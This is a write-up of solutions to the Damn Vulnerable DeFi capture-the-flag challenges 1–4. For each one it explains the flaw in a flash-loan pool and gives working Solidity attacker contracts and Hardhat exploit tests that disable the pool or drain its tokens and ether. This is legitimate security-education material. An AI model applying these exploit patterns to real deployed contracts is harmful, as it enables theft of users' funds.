![](cover.png)

# Damn Vulnerable DeFi solutions (v2)

Challenges created by [@tinchoabbate](https://twitter.com/tinchoabbate) at [damnvulnerabledefi.xyz](https://www.damnvulnerabledefi.xyz/).

## #1 - Unstoppable

The goal of this challenge is to disable flash loan lender contract. We are looking for DoS attack.

Vulnerability is located inside **flashLoan()** function in **UnstoppableLender.sol** :

```solidity
function flashLoan(uint256 borrowAmount) external nonReentrant {
  require(borrowAmount > 0, "Must borrow at least one token");

  uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
  require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

  // Ensured by the protocol via the `depositTokens` function
  assert(poolBalance == balanceBefore);

  damnValuableToken.transfer(msg.sender, borrowAmount);

  IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);

  uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
  require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
}
```

In order to disable contract from offering flash loans, we need to break one of the 4 safety checks inside the function.

Particiullary interesting one:

```solidity
// Ensured by the protocol via the `depositTokens` function
assert(poolBalance == balanceBefore);
```

The assert statement is making sure that contract balance of DVT token (`balanceBefore`) is matching the inner contract logic balance (`poolBalance`) that is updated when user deposits tokens using `depositTokens` function.

It assumes that no external transfers will occur, which is a flawed assumption.

We can exploit this by transferring DVT tokens to contract with ERC20 `transfer` function.

Solution code:

**unstoppable.challenge.js**

```js
// ...
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  await this.token
    .connect(attacker)
    .transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
});
// ...
```

## #2 - Naive Receiver

This challange might be tricky at first. Goal is not to attack lender, rather we need to drain funds from receiver even though vulnerability is inside lender's contract.

**NaiveReceiverLenderPool.sol** is offering flash loans, but it always takes constant fee of **1 ether**.
There is nothing wrong with contract's logic, but the way it offers flash loans is not very secure.

As we can see from `flashLoan()` function:

```solidity
function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {

    uint256 balanceBefore = address(this).balance;
    require(balanceBefore >= borrowAmount, "Not enough ETH in pool");

    require(borrower.isContract(), "Borrower must be a deployed contract");
    // Transfer ETH and handle control to receiver
    borrower.functionCallWithValue(
        abi.encodeWithSignature(
            "receiveEther(uint256)",
            FIXED_FEE
        ),
        borrowAmount
    );

    require(
        address(this).balance >= balanceBefore + FIXED_FEE,
        "Flash loan hasn't been paid back"
    );
}
```

It's clear that caller is specifying address of borrower as paramater. So, we can call `flashLoan()` and specify **flashLoanReceiver.sol**'s address as borrower, calling it 10 times would be enough to drain all funds from receiver since 1 loan costs 1 ether in fees.

We will make new **NaiveReceiverAttack.sol** contract that will essentially call `flashLoan()` 10 times with **flashLoanReceiver.sol**'s address as borrower paramater.

Solution code:

**NaiveReceiverAttack.sol :**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttack {
    NaiveReceiverLenderPool immutable pool;

    constructor(address payable _pool) {
        pool = NaiveReceiverLenderPool(_pool);
    }

    function attack(address victim) external {
        for (uint i = 0; i < 10; i++) {
            pool.flashLoan(victim, 1 ether);
        }
    }
}

```

**naive-receiver.challenge.js :**

```js
// ...
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  const AttackFactory = await ethers.getContractFactory(
    'NaiveReceiverAttack',
    attacker
  );
  const attackContract = await AttackFactory.deploy(this.pool.address);
  await attackContract.attack(this.receiver.address);
});
// ...
```

## #3 - Truster

Again, we have a flash loan lender contract. Goal is to drain all the funds from the pool. It offers flash loans for free, but has one big flaw.

Here is the main function:

```solidity
function flashLoan(
    uint256 borrowAmount,
    address borrower,
    address target,
    bytes calldata data
)
    external
    nonReentrant
{
    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
    require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

    damnValuableToken.transfer(borrower, borrowAmount);
    target.functionCall(data);
    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
    require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
}
```

As we can see logic seems fine, but `target` paramater and this line of code are critical to understand:

```solidity
target.functionCall(data);
```

It is very vulnerable external call. Essentially, pool is making call to `target` contract that **we** specify and it calls function that **we** specify with `data` paramater. Basically we can forward this call to any contract function with `msg.sender` being **pool** contract.

More specifically we will call **ERC20** token `approve` function and approve ourselves as spender of all pool's tokens. In order to perform this hack in one transaction we will make new **TrusterAttack.sol** contract that will make a malicous loan (approve it's address as pool tokens spender) and transfer all tokens from pool in same function call.

Solution code:

**TrusterAttack.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../truster/TrusterLenderPool.sol";

contract TrusterAttack {
    TrusterLenderPool immutable pool;
    IERC20 immutable token;

    constructor(address _pool, address _token) {
        pool = TrusterLenderPool(_pool);
        token = IERC20(_token);
    }

    function attack(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external {
        pool.flashLoan(borrowAmount, borrower, target, data);
        token.transferFrom(address(pool), msg.sender, 1000000 ether);
    }
}
```

**truster.challenge.js**

```js
// ...
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE  */
  const AttackFactory = await ethers.getContractFactory(
    'TrusterAttack',
    attacker
  );
  const attackContract = await AttackFactory.deploy(
    this.pool.address,
    this.token.address
  );

  const amount = 0;
  const borrower = attacker.address;
  const target = this.token.address;
  const abi = ['function approve(address spender, uint256 amount)'];
  const iface = new ethers.utils.Interface(abi);
  const data = iface.encodeFunctionData('approve', [
    attackContract.address,
    TOKENS_IN_POOL,
  ]);

  await attackContract.attack(amount, borrower, target, data);
});
// ...
```

## #4 - Side Entrance

This time our flash loan lender comes with additional funcitonality. It acts as a vault, so basically anyone can deposit their ether and withdraw at any time. Stacked ether is used to lend flash loans with no extra fees.

We will exploit this contract by taking advantage of insecure accounting logic. Let's take a look at `flashLoan` function.

```solidity
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;
    require(balanceBefore >= amount, "Not enough ETH in balance");

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");
}
```

Two requirements seem fine at first, but one scenairo hasn't been accounted for. Once we receive flash loan, nothing prevents us from returning the loan with pool's `deposit` function. That way, inside pool's accounting, we are the owners of deposited funds. Pool balance stayed the same, but inner logic is broken and we are able to withdraw everything.

For the solution, we will create new **SideEntranceAttack.sol** contract and implement the exploit.

Solution code:

**SideEntranceAttack.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttack {
    SideEntranceLenderPool immutable pool;
    address immutable owner;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    function attack(uint amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "transfer failed");
    }
}
```

**side-entrance.challenge.js**

```js
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  const AttackFactory = await ethers.getContractFactory(
    'SideEntranceAttack',
    attacker
  );
  const attackContract = await AttackFactory.deploy(this.pool.address);

  await attackContract.attack(ETHER_IN_POOL);
});
```
